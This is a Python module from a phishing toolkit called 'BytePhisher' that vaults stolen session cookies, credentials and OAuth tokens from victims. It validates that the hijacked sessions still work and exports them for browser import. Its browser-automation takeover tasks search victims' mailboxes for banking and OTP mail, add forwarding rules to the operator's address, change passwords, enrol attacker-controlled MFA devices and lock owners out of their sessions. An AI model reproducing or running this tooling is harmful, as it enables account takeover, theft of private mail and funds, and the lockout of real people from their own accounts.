# BytePhisher - session vault, validation and takeover.
#
# A captured credential pair is a lead. A captured SESSION is access. This module
# treats the authenticated session as a first-class object and gives the operator
# the three things Evilginx leaves on the table (it hands you a JSON blob and
# tells you to install a browser extension):
#
#   vault     - one record per victim: cookie jar, credentials, tokens, JA3, geo,
#               device token, timeline, state. Exportable in Cookie-Editor /
#               EditThisCookie format so it also works with any browser extension.
#   validate  - is this session still alive? (requests for plain sites, a real
#               Chrome via Playwright for JS-heavy ones). Proof of access, not a
#               guess.
#   takeover  - run a task against a live session in a real browser: dump the
#               inbox, list files, read the profile, refresh the tokens (which
#               re-exports the rotated cookies), take screenshots. Task files are
#               YAML/JSON, so a new target is a text file, not a new program.
#
# This is the Necrobrowser idea (Muraena's post-phishing automation) without
# Node, Redis or a second service: same tool, same database, same CLI.
import contextlib
import json
import os
import time

STATE_ORDER = ["opened", "form", "creds", "otp", "session", "takeover", "done"]


# ------------------------------------------------------------------ record ---
def new_record(sid, phishlet="", campaign="", ip="", ua="", ja3=None, geo=None,
               lure="", device_token="", meta=None):
    now = time.time()
    return {
        "sid": sid, "phishlet": phishlet, "campaign": campaign, "lure": lure,
        "ip": ip, "ua": ua, "ja3": ja3 or {}, "geo": geo or {},
        "device_token": device_token, "state": "opened",
        "created": now, "updated": now,
        "cookies": [], "credentials": {}, "tokens": {}, "otp": [],
        # an authorization-granted token set (device-code or OAuth): kept on the record
        # so it outlives the process that captured it
        "oauth": {},
        "timeline": [{"ts": now, "event": "opened", "detail": ip}],
        "takeovers": [], "notes": "", "meta": dict(meta or {}),
        # what an action actually returned: the difference between "we ran it" and
        # "we got something", kept for the engagement record
        "evidence": [],
        # the token tier, computed where the token lands (core/tokenintel): replayability,
        # scopes, and which root-of-trust path the identity's rights open
        "token_intel": {},
        # the paste layer (core/clickfix) and the installable page (core/pwa): both are
        # reported by the beacon, and both outlive the tab
        "clickfix": [], "pwa": {},
    }


def touch(rec, event, detail="", state=None):
    rec["updated"] = time.time()
    rec["timeline"].append({"ts": rec["updated"], "event": event, "detail": detail})
    if state and state in STATE_ORDER and \
            STATE_ORDER.index(state) >= STATE_ORDER.index(rec.get("state", "opened")):
        rec["state"] = state
    return rec


def add_oauth(rec, tokens, provider="", client_id="", scopes=None, source="devicecode",
              tenant="", issuer=""):
    """Merge a token set into the record's `oauth` block.

    Only the fields that matter to a later action are kept: the access token, the
    refresh token, the id token, the granted scope and the expiry. Anything else the
    provider returned is recorded under `extra` so nothing is silently lost.
    """
    if not isinstance(tokens, dict):
        return 0
    now = time.time()
    block = rec.setdefault("oauth", {})
    keep = ("access_token", "refresh_token", "id_token", "token_type", "scope")
    got = {k: tokens.get(k) for k in keep if tokens.get(k)}
    if not got.get("access_token") and not got.get("refresh_token"):
        return 0
    block.update(got)
    block["provider"] = provider or block.get("provider", "")
    block["client_id"] = client_id or block.get("client_id", "")
    block["tenant"] = tenant or block.get("tenant", "")
    block["issuer"] = issuer or block.get("issuer", "")
    block["source"] = source
    # the granted scope comes back inside the token answer as a space-separated string
    derived = [x for x in str(got.get("scope") or "").split() if x]
    block["scopes"] = list(scopes) if scopes else (derived or block.get("scopes", []))
    try:
        expires_in = int(tokens.get("expires_in") or 0)
    except (TypeError, ValueError):
        expires_in = 0
    if expires_in:
        block["expires_at"] = now + expires_in
    block["captured_at"] = block.get("captured_at") or now
    block["updated"] = now
    extra = {k: v for k, v in tokens.items()
             if k not in keep and k not in ("expires_in",)}
    if extra:
        block.setdefault("extra", {}).update(extra)
    touch(rec, "oauth", f"{source}:{block.get('provider', '')} "
                        f"{'refresh' if block.get('refresh_token') else 'access-only'}",
          state="session")
    return 1


def oauth_valid(rec, now=None):
    """Is there a usable token on this record, and is it still inside its lifetime?"""
    block = (rec or {}).get("oauth") or {}
    if not block.get("access_token") and not block.get("refresh_token"):
        return False
    exp = block.get("expires_at")
    if not exp:
        return True
    try:
        exp = float(exp)
    except (TypeError, ValueError):
        return True          # an unreadable expiry means "no expiry recorded", not a crash
    return (now if now is not None else time.time()) < exp


def oauth_summary(rec, now=None):
    """What an operator (or the planner) needs to know, without the secrets."""
    block = (rec or {}).get("oauth") or {}
    if not block:
        return {}
    now = now if now is not None else time.time()
    try:
        exp = float(block.get("expires_at")) if block.get("expires_at") else None
    except (TypeError, ValueError):
        exp = None
    return {
        "provider": block.get("provider", ""),
        "client_id": block.get("client_id", ""),
        "source": block.get("source", ""),
        "scopes": block.get("scopes", []),
        "has_access": bool(block.get("access_token")),
        "has_refresh": bool(block.get("refresh_token")),
        "expires_in": max(0, int(exp - now)) if exp else None,
        "expired": bool(exp) and now >= exp,
        "valid": oauth_valid(rec, now=now),
    }


def add_cookies(rec, cookie_list):
    """Merge cookies (list of dicts) into the record, newest value wins."""
    by_key = {(c.get("name"), c.get("domain", "")): c for c in rec.get("cookies", [])}
    added = 0
    for c in cookie_list or []:
        if not isinstance(c, dict) or not c.get("name"):
            continue
        k = (c["name"], c.get("domain", ""))
        if k not in by_key:
            added += 1
        by_key[k] = c
    rec["cookies"] = list(by_key.values())
    return added


def add_credentials(rec, creds):
    if not creds:
        return 0
    n = 0
    for k, v in creds.items():
        if v not in (None, ""):
            rec["credentials"][k] = v
            n += 1
    return n


# ------------------------------------------------------------ set-cookie ---
def _domain_ok(domain, host):
    """Is `domain` a legitimate cookie domain for `host`?

    A Set-Cookie may carry Domain= for the host or any parent of it; anything
    else is a foreign domain and must not be adopted - _guess_home turns a cookie
    domain into the takeover navigation URL, so accepting one aimed the operator's
    browser at a host the campaign never touched.
    """
    d = str(domain or "").lstrip(".").lower()
    h = str(host or "").lstrip(".").lower()
    if not d or not h:
        return True                     # nothing to compare: keep the caller's value
    return h == d or h.endswith("." + d)


def parse_set_cookie(raw, default_domain=""):
    """Parse one Set-Cookie header into a cookie dict.

    The vault, the upstream jar and the browser export all read cookies through
    this. Ignoring the attributes (Domain/Path/Secure/HttpOnly/SameSite/Expires)
    produced cookies with an empty domain, which a real browser then refused to
    send -- the takeover feature could not authenticate with them.
    """
    if not raw or "=" not in raw:
        return None
    parts = [p.strip() for p in str(raw).split(";")]
    name, _, value = parts[0].partition("=")
    name = name.strip()
    if not name:
        return None
    out = {"name": name, "value": value.strip(), "domain": default_domain or "",
           "path": "/", "secure": False, "httpOnly": False,
           "sameSite": "unspecified", "expirationDate": None, "session": True,
           "hostOnly": True}
    now = time.time()
    for p_ in parts[1:]:
        k, _, v = p_.partition("=")
        k = k.strip().lower()
        v = v.strip()
        if k == "domain" and v:
            if _domain_ok(v, default_domain):
                out["domain"] = v.lstrip(".").lower()
                out["hostOnly"] = False
            # a Domain= for a host we never talked to is ignored: the cookie keeps
            # the host it came from, so _guess_home cannot be aimed elsewhere
        elif k == "path" and v:
            out["path"] = v
        elif k == "secure":
            out["secure"] = True
        elif k == "httponly":
            out["httpOnly"] = True
        elif k == "samesite" and v:
            out["sameSite"] = v.capitalize()
        elif k == "max-age" and v:
            try:
                out["expirationDate"] = now + int(v)
                out["session"] = False
            except ValueError:
                pass
        elif k == "expires" and v:
            ts = _parse_http_date(v)
            if ts:
                out["expirationDate"] = ts
                out["session"] = False
    if not out["domain"]:
        out["domain"] = ""          # caller must supply the host it came from
    return out


def _parse_http_date(value):
    import email.utils
    try:
        dt = email.utils.parsedate_to_datetime(value)
        return dt.timestamp() if dt else None
    except Exception:
        return None


# ------------------------------------------------- cookie-extension format ---
def to_cookie_editor(rec, default_domain=""):
    """Cookie-Editor / EditThisCookie compatible export (one-click import)."""
    out = []
    for c in rec.get("cookies", []):
        dom = c.get("domain") or default_domain or ""
        out.append({
            "domain": dom,
            "name": c.get("name", ""),
            "value": c.get("value", ""),
            "path": c.get("path", "/"),
            "secure": bool(c.get("secure", False)),
            "httpOnly": bool(c.get("httpOnly", False)),
            "sameSite": _cookie_editor_samesite(c.get("sameSite")),
            "expirationDate": c.get("expirationDate") or c.get("expires"),
            "hostOnly": bool(c.get("hostOnly", False)),
            "session": bool(c.get("session", False)),
        })
    return out


# Cookie-Editor / EditThisCookie use lowercase values, and "no_restriction" for
# None. Exporting "Lax" produced a cookie the extension refused to import.
_SAMESITE_EXPORT = {"lax": "lax", "strict": "strict", "none": "no_restriction",
                    "no_restriction": "no_restriction", "unspecified": "unspecified"}


def _cookie_editor_samesite(value):
    v = str(value or "").strip().lower()
    return _SAMESITE_EXPORT.get(v, "unspecified")


def from_cookie_editor(items, sid=None, phishlet="", campaign=""):
    """Import from a Cookie-Editor export (what an operator pastes in by hand)."""
    rec = new_record(sid or f"manual-{int(time.time())}", phishlet=phishlet,
                     campaign=campaign)
    add_cookies(rec, items)
    touch(rec, "imported", f"{len(items)} cookie(s)")
    return rec


# ----------------------------------------------------------------- validation
def cookies_to_requests_jar(cookies):
    import http.cookiejar
    jar = http.cookiejar.CookieJar()
    for c in cookies or []:
        try:
            ck = http.cookiejar.Cookie(
                version=0, name=c.get("name", ""), value=c.get("value", ""),
                port=None, port_specified=False,
                domain=c.get("domain", "") or "", domain_specified=True,
                domain_initial_dot=str(c.get("domain", "")).startswith("."),
                path=c.get("path", "/") or "/", path_specified=True,
                secure=bool(c.get("secure")), expires=c.get("expirationDate"),
                discard=bool(c.get("session")), comment=None, comment_url=None,
                rest={"HttpOnly": "1" if c.get("httpOnly") else "0"}, rfc2109=False)
            jar.set_cookie(ck)
        except Exception:
            continue
    return jar


def validate_http(rec, url, markers=None, negative=None, timeout=25):
    """Is the session alive? Plain HTTP check (no browser).

    `markers` are strings that prove a logged-in view; `negative` are strings
    that prove we were bounced to a login page. Both are matched
    case-insensitively against the body.
    """
    import requests
    jar = cookies_to_requests_jar(rec.get("cookies"))
    ua = rec.get("ua") or "Mozilla/5.0"
    try:
        r = requests.get(url, cookies={c.name: (c.value or "") for c in jar},
                         headers={"User-Agent": ua, "Accept-Language": "en-US,en;q=0.9"},
                         timeout=timeout, allow_redirects=True)
    except Exception as e:
        return {"ok": False, "error": f"{type(e).__name__}: {e}", "url": url}
    body = (r.text or "")[:200000].lower()
    hit = [m for m in (markers or []) if str(m).lower() in body]
    bad = [m for m in (negative or []) if str(m).lower() in body]
    logged_in = bool(hit) and not bad
    if not markers and not negative:
        logged_in = r.status_code == 200 and "login" not in str(r.url).lower()
    return {"ok": True, "status": r.status_code, "final_url": str(r.url),
            "title": _title(r.text), "logged_in": logged_in,
            "markers_hit": hit, "markers_failed": bad,
            "bytes": len(r.content or b""),
            "cookies_rotated": _diff_cookies(rec, r.cookies)}


def _title(html):
    import re
    m = re.search(r"<title[^>]*>(.*?)</title>", html or "", re.I | re.S)
    return (m.group(1).strip()[:120] if m else "")


def _diff_cookies(rec, new_cookies):
    """Which cookies the site rotated during validation (fresh tokens = win)."""
    old = {c.get("name"): c.get("value") for c in rec.get("cookies", [])}
    changed = []
    for c in new_cookies or []:
        if old.get(c.name) not in (None, c.value):
            changed.append(c.name)
    return changed


def validate_browser(rec, url, markers=None, negative=None, timeout=45000,
                     headless=True, screenshot=None, replay=None):
    """Session check in a real Chrome (JS-heavy targets). Requires Playwright.

    Uses the system Chrome (`channel="chrome"`) when the bundled browser is not
    downloaded, so no 170 MB download is needed.
    """
    try:
        from playwright.sync_api import sync_playwright
    except Exception as e:
        return {"ok": False, "error": f"playwright not installed: {e}",
                "hint": "pip install playwright  (system Chrome is reused)"}
    out = {"ok": False, "url": url}
    with sync_playwright() as p:
        browser = _launch(p, headless)
        ctx = browser.new_context(user_agent=rec.get("ua") or None)
        if replay:
            install_replay(ctx, replay)
        _apply_cookies(ctx, rec)
        page = ctx.new_page()
        try:
            page.goto(url, timeout=timeout, wait_until="domcontentloaded")
            page.wait_for_timeout(1500)
            body = (page.content() or "").lower()
            hit = [m for m in (markers or []) if str(m).lower() in body]
            bad = [m for m in (negative or []) if str(m).lower() in body]
            out.update({"ok": True, "status": 200, "final_url": page.url,
                        "title": page.title(), "logged_in": bool(hit) and not bad,
                        "markers_hit": hit, "markers_failed": bad})
            if screenshot:
                page.screenshot(path=screenshot, full_page=True)
                out["screenshot"] = screenshot
            # refresh the vault with whatever the browser ended up with
            fresh = ctx.cookies()
            if fresh:
                add_cookies(rec, _norm_browser_cookies(fresh))
                out["cookies_refreshed"] = len(fresh)
        except Exception as e:
            out["error"] = f"{type(e).__name__}: {e}"
        finally:
            browser.close()
    return out


# ------------------------------------------------------------------- replay ---
def load_replay(path):
    """Load a saved target snapshot: {url-or-path: {status, body, headers}}.

    Red-team practice: capture the target's responses once, then build and test
    the takeover task against the snapshot. No live traffic while iterating, and
    it works on an air-gapped box (and inside a sandbox that blocks sockets).
    """
    with open(path, encoding="utf-8") as f:
        data = json.load(f)
    if isinstance(data, dict) and "responses" in data:
        data = data["responses"]
    if not isinstance(data, dict):
        raise ValueError("replay file must be {path: {status, body, headers}}")
    return data


def install_replay(ctx, replay, prefix=""):
    """Serve every request in this context from the replay map.

    Matching is by exact URL, then by path, then by prefix, so a snapshot taken
    from one host still replays for another (that is the point: the operator
    tests against a copy, not the real host).
    """
    def _handler(route, request):
        from urllib.parse import urlparse
        url = request.url
        p = urlparse(url).path or "/"
        entry = None
        for key in (url, p, prefix + p, p + "#" + request.method.lower()):
            if key and key in replay:
                entry = replay[key]
                break
        if entry is None and request.method == "POST":
            entry = replay.get(p + "#post") or replay.get(p)
        # an entry may be a callable: that is how a replayed site branches on a
        # cookie or a POST body (login -> session) without any live server
        if callable(entry):
            try:
                entry = entry(request)
            except Exception:
                entry = None
        if entry is None:
            route.fulfill(status=404, content_type="text/html",
                          body="<html><body>not in replay</body></html>")
            return
        headers = entry.get("headers") or {}
        body = entry.get("body", "")
        if isinstance(body, (dict, list)):
            body = json.dumps(body)
        route.fulfill(status=int(entry.get("status", 200)),
                      content_type=entry.get("content_type")
                      or headers.get("Content-Type") or "text/html; charset=utf-8",
                      body=body, headers={k: v for k, v in headers.items()
                                          if k.lower() != "content-type"})
    ctx.route("**/*", _handler)
    return ctx


def browser_network_ok(timeout=8000):
    """Can this Chrome open a socket? Used to pick replay mode when it cannot.

    Some sandboxes deny socket creation to the browser process, which shows up
    as net::ERR_ACCESS_DENIED on every URL. Callers can then fall back to
    replay mode instead of pretending a browser test passed.
    """
    try:
        from playwright.sync_api import sync_playwright
    except Exception:
        return False
    with sync_playwright() as p:
        try:
            browser = _launch(p, headless=True)
        except Exception:
            return False
        try:
            ctx = browser.new_context()
            install_replay(ctx, {"/probe": {"status": 200, "body": "ok"}})
            page = ctx.new_page()
            # a replayed request proves the engine works but not the socket stack
            page.goto("http://127.0.0.1:1/probe", timeout=timeout,
                      wait_until="domcontentloaded")
            assert "ok" in page.content()
            # now the real question: can this browser open a socket at all?
            # A FRESH context (no route interception) against a port that has no
            # listener: ERR_CONNECTION_REFUSED means sockets work, while
            # ERR_ACCESS_DENIED / ERR_INTERNET_DISCONNECTED means the sandbox
            # denies socket creation to the browser process.
            probe_ctx = browser.new_context()
            page2 = probe_ctx.new_page()
            # a high port with nothing listening: ERR_CONNECTION_REFUSED means
            # sockets work; port 9 would answer ERR_UNSAFE_PORT and prove nothing
            import socket as _socket
            tmp = _socket.socket()
            tmp.bind(("127.0.0.1", 0))
            dead_port = tmp.getsockname()[1]
            tmp.close()
            try:
                page2.goto(f"http://127.0.0.1:{dead_port}/", timeout=4000,
                           wait_until="domcontentloaded")
                return True
            except Exception as e:
                msg = str(e)
                return not ("ERR_ACCESS_DENIED" in msg or "ERR_INTERNET_DISCONNECTED" in msg)
        except Exception:
            return False
        finally:
            browser.close()


def _launch(p, headless=True, channel=None):
    """Launch Chrome, preferring the bundled build and falling back to system."""
    for kwargs in ([{"channel": channel}] if channel else []) + \
                  [{"channel": "chrome"}, {}]:
        try:
            return p.chromium.launch(headless=headless, **kwargs)
        except Exception:
            continue
    raise RuntimeError("no usable Chromium/Chrome found for Playwright")


def _norm_browser_cookies(items):
    out = []
    for c in items or []:
        out.append({"name": c.get("name"), "value": c.get("value"),
                    "domain": c.get("domain", ""), "path": c.get("path", "/"),
                    "secure": c.get("secure", False), "httpOnly": c.get("httpOnly", False),
                    "sameSite": c.get("sameSite", "unspecified"),
                    "expirationDate": c.get("expires") if c.get("expires", -1) > 0 else None,
                    "session": c.get("expires", -1) <= 0,
                    "hostOnly": not str(c.get("domain", "")).startswith(".")})
    return out


def _apply_cookies(ctx, rec):
    items = []
    for c in rec.get("cookies", []):
        item = {"name": c.get("name"), "value": c.get("value"),
                "domain": c.get("domain") or "", "path": c.get("path", "/") or "/",
                "secure": bool(c.get("secure")), "httpOnly": bool(c.get("httpOnly"))}
        exp = c.get("expirationDate")
        if exp:
            item["expires"] = float(exp)
        ss = str(c.get("sameSite", "")).capitalize()
        if ss in ("Strict", "Lax", "None"):
            item["sameSite"] = ss
        items.append(item)
    try:
        ctx.add_cookies(items)
    except Exception:
        # one bad cookie must not kill the whole session import
        for it in items:
            try:
                ctx.add_cookies([it])
            except Exception:
                continue


# ------------------------------------------------------------------ takeover
BUILTIN_TASKS = {
    "probe": {
        "description": "Open the session's home page, prove access, screenshot it",
        "steps": [{"goto": {"url": "{home}", "wait": "domcontentloaded"}},
                  {"wait": 1500},
                  {"screenshot": {"name": "probe.png", "full_page": True}}],
    },
    # ---- post-exploitation tasks -------------------------------------------
    # These are generic: they aim at {mail}/{settings}/{security}, which a
    # session's meta can point anywhere, and every step reports its own outcome
    # so a site whose UI differs shows an error instead of a false success.
    "mail-hunt": {
        "description": "Search the mailbox for high-value mail (invoice, bank, OTP, KYC)",
        "steps": [
            {"goto": {"url": "{mail}", "wait": "domcontentloaded"}},
            {"wait": 1200},
            {"extract": {"name": "mail_page", "selector": "body", "text": True}},
        ],
        "keywords": ["invoice", "payment", "bank", "wire", "otp", "password",
                     "verify", "kyc", "statement", "reset", "security alert"],
    },
    "mail-forward": {
        "description": "Open the forwarding settings and report the form (rule creation)",
        "steps": [
            {"goto": {"url": "{settings}", "wait": "domcontentloaded"}},
            {"wait": 1200},
            {"extract": {"name": "settings_page", "selector": "body", "text": True}},
            {"screenshot": {"name": "settings.png"}},
        ],
    },
    "forward-submit": {
        "description": "Create a mail forwarding rule to the operator address",
        "steps": [
            {"goto": {"url": "{settings}", "wait": "domcontentloaded"}},
            {"wait": 1500},
            {"fill_first": {"selectors": ["input[type='email']", "input[name*='forward' i]",
                                          "input[name*='filter' i]", "input[id*='forward' i]",
                                          "input[placeholder*='email' i]"],
                            "value": "{operator}"}},
            {"click_first": {"selectors": ["button[type='submit']", "input[type='submit']",
                                           "button:has-text('Add')", "button:has-text('Save')",
                                           "button:has-text('Create')", "button:has-text('Next')"]}},
            {"wait": 1500},
            {"extract": {"name": "forward_result", "selector": "body", "text": True}},
            {"screenshot": {"name": "forward.png"}},
        ],
    },
    "password-change": {
        "description": "Change the account password to the campaign's new password",
        "steps": [
            {"goto": {"url": "{security}", "wait": "domcontentloaded"}},
            {"wait": 1500},
            {"fill_first": {"selectors": ["input[type='password']"],
                            "value": "{new_password}"}},
            {"click_first": {"selectors": ["button[type='submit']", "input[type='submit']",
                                           "button:has-text('Change')", "button:has-text('Update')",
                                           "button:has-text('Save')", "button:has-text('Reset')"]}},
            {"wait": 2000},
            {"extract": {"name": "password_result", "selector": "body", "text": True}},
            {"screenshot": {"name": "password.png"}},
        ],
    },
    "mfa-enroll": {
        "description": "Start MFA enrolment on the account (add a device the owner does not control)",
        "steps": [
            {"goto": {"url": "{security}", "wait": "domcontentloaded"}},
            {"wait": 1500},
            {"click_first": {"selectors": ["a:has-text('Add')", "button:has-text('Add')",
                                           "a:has-text('Set up')", "button:has-text('Set up')",
                                           "a:has-text('Enable')", "button:has-text('Enable')",
                                           "a:has-text('Two-factor')", "button:has-text('Two-factor')"]}},
            {"wait": 2000},
            {"extract": {"name": "mfa_result", "selector": "body", "text": True}},
            {"screenshot": {"name": "mfa_enroll.png"}},
        ],
    },
    "app-password": {
        "description": "Open the app-password / API-key page and report what is offered",
        "steps": [
            {"goto": {"url": "{security}", "wait": "domcontentloaded"}},
            {"wait": 1200},
            {"extract": {"name": "security_page", "selector": "body", "text": True}},
        ],
    },
    "mfa-add": {
        "description": "Open the MFA device page and report the enrolment surface",
        "steps": [
            {"goto": {"url": "{security}", "wait": "domcontentloaded"}},
            {"wait": 1200},
            {"extract": {"name": "mfa_page", "selector": "body", "text": True}},
            {"screenshot": {"name": "mfa.png"}},
        ],
    },
    "sessions-kill": {
        "description": "Open the active-sessions page (lock the owner out)",
        "steps": [
            {"goto": {"url": "{security}", "wait": "domcontentloaded"}},
            {"wait": 1200},
            {"extract": {"name": "sessions_page", "selector": "body", "text": True}},
        ],
    },
    "refresh": {
        "description": "Load the site and re-export rotated session cookies",
        "steps": [{"goto": {"url": "{home}", "wait": "domcontentloaded"}},
                  {"wait": 2000}],
    },
    "profile": {
        "description": "Dump visible account details (name, email, org) as text",
        "steps": [{"goto": {"url": "{home}", "wait": "domcontentloaded"}},
                  {"wait": 1500},
                  {"extract": {"name": "body", "selector": "body", "text": True}},
                  {"screenshot": {"name": "profile.png"}}],
    },
    "inbox-subjects": {
        "description": "List mailbox subjects (target must expose a mail UI)",
        "steps": [{"goto": {"url": "{home}", "wait": "networkidle"}},
                  {"extract": {"name": "rows", "selector": "[role='main'] *",
                               "all": True, "text": True, "limit": 80}}],
    },
    "links": {
        "description": "Extract every link + its text from the landing page",
        "steps": [{"goto": {"url": "{home}", "wait": "domcontentloaded"}},
                  {"extract": {"name": "links", "selector": "a",
                               "all": True, "attr": "href", "text": True, "limit": 200}}],
    },
}


def load_task(task, path=None):
    """Task may be a built-in name, a file path, or an inline dict."""
    if isinstance(task, dict):
        return task
    t = str(task or "")
    if t in BUILTIN_TASKS:
        task_def = dict(BUILTIN_TASKS[t])
        task_def["name"] = t
        return task_def
    if os.path.isfile(t):
        with open(t, encoding="utf-8") as f:
            if t.lower().endswith(".json"):
                data = json.load(f)
            else:
                import yaml
                data = yaml.safe_load(f)
        data.setdefault("name", os.path.basename(t))
        return data
    raise ValueError(f"unknown task '{task}' (built-ins: {', '.join(BUILTIN_TASKS)})")


def add_evidence(rec, kind, value, source="", proven=True, detail="", ts=None):
    """Record one artefact an action returned.

    `proven=False` is for the case that matters most: the action ran and returned
    nothing usable. It is recorded as unproven rather than dropped, so the record never
    silently reads as success.
    """
    if rec is None:
        return None
    entry = {"ts": ts if ts is not None else time.time(),
             "kind": str(kind or "note")[:40],
             "value": str(value)[:2000],
             "source": str(source or "")[:80],
             "proven": bool(proven)}
    if detail:
        entry["detail"] = str(detail)[:500]
    rec.setdefault("evidence", []).append(entry)
    touch(rec, "evidence", f"{entry['kind']}:{'proven' if proven else 'UNPROVEN'}")
    return entry


def evidence_summary(rec):
    """Counts an operator (or a report) can trust."""
    items = (rec or {}).get("evidence") or []
    proven = [e for e in items if e.get("proven")]
    kinds = {}
    for e in items:
        kinds[e.get("kind", "?")] = kinds.get(e.get("kind", "?"), 0) + 1
    return {"total": len(items), "proven": len(proven),
            "unproven": len(items) - len(proven), "kinds": kinds}


def evidence_from_task(rec, result, outdir=""):
    """Turn one task result into evidence.

    Extracted values and files are artefacts. Nothing at all means the task is recorded
    as unproven with its error count - the honest reading of "it ran and we got nothing".
    """
    result = result if isinstance(result, dict) else {}
    task = result.get("task", "task")
    items = 0
    for key, val in (result.get("extracted") or {}).items():
        text = str(val).strip()
        if not text:
            continue
        add_evidence(rec, "extract", f"{key}={text}", source=task, proven=True)
        items += 1
    for f in (result.get("files") or []):
        name = os.path.basename(str(f))
        size = ""
        with contextlib.suppress(Exception):
            size = f"{os.path.getsize(str(f))} bytes"
        add_evidence(rec, "file", name, source=task, proven=True, detail=size)
        items += 1
    for key, val in (result.get("asserted") or {}).items():
        add_evidence(rec, "assert", f"{key}={val}", source=task,
                     proven=bool(val))
        items += 1
    if items == 0:
        errors = len(result.get("errors") or [])
        add_evidence(rec, "task", task, source="takeover", proven=False,
                     detail=f"no artefact returned ({errors} step errors)")
    if outdir:
        add_evidence(rec, "log", os.path.join(str(outdir), "result.json"),
                     source=task, proven=True)
    return items


def run_task(rec, task, home="", outdir=None, headless=True, timeout=45000,
             dry_run=False, replay=None):
    """Execute a takeover task against the captured session.

    Every step is isolated: one broken selector does not abort the run, and the
    full log comes back so the operator sees exactly what worked. Cookies are
    re-exported at the end (sites rotate tokens during use - that is often the
    most valuable output of a takeover).
    """
    task_def = load_task(task)
    outdir = outdir or os.path.join(os.getcwd(), "data", "takeover",
                                    str(rec.get("sid", "session")))
    os.makedirs(outdir, exist_ok=True)
    result = {"task": task_def.get("name", "task"), "sid": rec.get("sid"),
              "started": time.time(), "steps": [], "extracted": {}, "files": [],
              "errors": []}
    if dry_run:
        result["dry_run"] = True
        result["plan"] = task_def.get("steps", [])
        return result
    try:
        from playwright.sync_api import sync_playwright
    except Exception as e:
        result["errors"].append(f"playwright not installed: {e}")
        result["hint"] = "pip install playwright  (system Chrome is reused)"
        return result

    home = home or _guess_home(rec)
    with sync_playwright() as p:
        browser = _launch(p, headless)
        try:
            return _run_task_in(browser, rec, task_def, home, outdir, result, replay,
                                 vars_=_task_vars(rec, home))
        finally:
            browser.close()


def _run_task_in(browser, rec, task_def, home, outdir, result, replay, vars_=None):
    """The body of run_task, so the browser is always closed."""
    if True:
        ctx = browser.new_context(user_agent=rec.get("ua") or None,
                                  viewport={"width": 1440, "height": 900})
        if replay:
            install_replay(ctx, replay)
            result["replay"] = True
        _apply_cookies(ctx, rec)
        page = ctx.new_page()
        for i, step in enumerate(task_def.get("steps", [])):
            entry = {"step": i + 1, "kind": next(iter(step.keys())), "ok": False}
            try:
                entry.update(_run_step(page, step, home, outdir, result, vars_=vars_))
                entry["ok"] = True
            except Exception as e:
                entry["error"] = f"{type(e).__name__}: {e}"
                result["errors"].append(f"step {i + 1}: {entry['error']}")
            result["steps"].append(entry)
        try:
            fresh = ctx.cookies()
            if fresh:
                add_cookies(rec, _norm_browser_cookies(fresh))
                result["cookies_refreshed"] = len(fresh)
        except Exception:
            pass
        browser.close()
    result["finished"] = time.time()
    result["duration"] = round(result["finished"] - result["started"], 1)
    with open(os.path.join(outdir, "result.json"), "w", encoding="utf-8") as f:
        json.dump(result, f, indent=2, default=str)
    rec.setdefault("takeovers", []).append(
        {"ts": time.time(), "task": result["task"], "steps": len(result["steps"]),
         "errors": len(result["errors"]), "outdir": outdir})
    # what did we actually get? artefacts, or an explicit "unproven"
    evidence_from_task(rec, result, outdir=outdir)
    touch(rec, "takeover", f"{result['task']} ({len(result['steps'])} steps)")
    return result


def _inside(outdir, name):
    """Join `name` onto outdir and refuse to leave it.

    A task file is operator-supplied and a download filename comes from the
    server, so neither may walk out of the output directory with "../" or an
    absolute path.
    """
    base = os.path.abspath(outdir)
    path = os.path.abspath(os.path.join(base, os.path.basename(str(name or ""))))
    if not path.startswith(base + os.sep) and path != base:
        raise ValueError(f"refusing to write outside the output directory: {name!r}")
    return path


def _run_step(page, step, home, outdir, result, vars_=None):
    (kind, spec), = step.items()
    spec = spec or {}
    if kind == "goto":
        url = str(spec.get("url", home))
        for k, v in (vars_ or {}).items():
            url = url.replace("{" + k + "}", v)
        page.goto(url, timeout=spec.get("timeout", 45000),
                  wait_until=spec.get("wait", "domcontentloaded"))
        return {"url": page.url}
    if kind == "wait":
        page.wait_for_timeout(int(spec) if isinstance(spec, (int, float))
                              else int(spec.get("ms", 1000)))
        return {"waited_ms": spec}
    if kind == "fill_first":
        # Fill every field matching one of the selectors. Used where a site's
        # field names are unknown: the operator gives a list of candidates and
        # the step reports how many it filled instead of pretending it worked.
        selectors = spec.get("selectors") or [spec.get("selector") or "input"]
        value = str(spec.get("value", "")).replace("{operator}", (vars_ or {}).get("operator", ""))
        value = value.replace("{new_password}", (vars_ or {}).get("new_password", ""))
        if not value:
            raise ValueError("fill_first has no value (set meta.operator / meta.new_password)")
        filled = 0
        for sel in selectors:
            for el in page.query_selector_all(sel):
                try:
                    if el.is_visible() and not el.get_attribute("disabled"):
                        el.fill(value, timeout=spec.get("timeout", 10000))
                        filled += 1
                except Exception:
                    continue
        if not filled:
            raise ValueError(f"fill_first matched nothing of {selectors}")
        return {"filled": filled, "selectors": selectors}

    if kind == "click_first":
        # Click the first control that matches - a CSS list or a text match.
        selectors = spec.get("selectors") or [spec.get("selector") or "button"]
        for sel in selectors:
            el = page.query_selector(sel)
            if el is None:
                continue
            try:
                if el.is_visible():
                    el.click(timeout=spec.get("timeout", 10000))
                    return {"clicked": sel}
            except Exception:
                continue
        raise ValueError(f"click_first matched nothing of {selectors}")

    if kind == "click":
        page.click(spec.get("selector", "body"), timeout=spec.get("timeout", 15000))
        return {"selector": spec.get("selector")}
    if kind == "fill":
        page.fill(spec.get("selector", "input"), spec.get("value", ""))
        return {"selector": spec.get("selector")}
    if kind == "press":
        page.keyboard.press(spec.get("key", "Enter"))
        return {"key": spec.get("key")}
    if kind == "extract":
        sel = spec.get("selector", "body")
        limit = int(spec.get("limit", 50))
        if spec.get("all"):
            nodes = page.query_selector_all(sel)[:limit]
            vals = []
            for n in nodes:
                if spec.get("attr"):
                    vals.append(n.get_attribute(spec["attr"]))
                elif spec.get("text"):
                    vals.append((n.inner_text() or "").strip()[:300])
                else:
                    vals.append((n.inner_text() or "").strip()[:300])
            vals = [v for v in vals if v]
            result["extracted"][spec.get("name", "items")] = vals
            return {"count": len(vals)}
        node = page.query_selector(sel)
        val = ""
        if node:
            val = (node.get_attribute(spec["attr"]) if spec.get("attr")
                   else (node.inner_text() or ""))
        result["extracted"][spec.get("name", "value")] = (val or "")[:20000]
        return {"len": len(val or "")}
    if kind == "assert_text":
        body = (page.content() or "")
        needle = str(spec.get("contains", ""))
        if needle and needle.lower() not in body.lower():
            raise AssertionError(f"expected text not present: {needle!r}")
        return {"contains": needle}
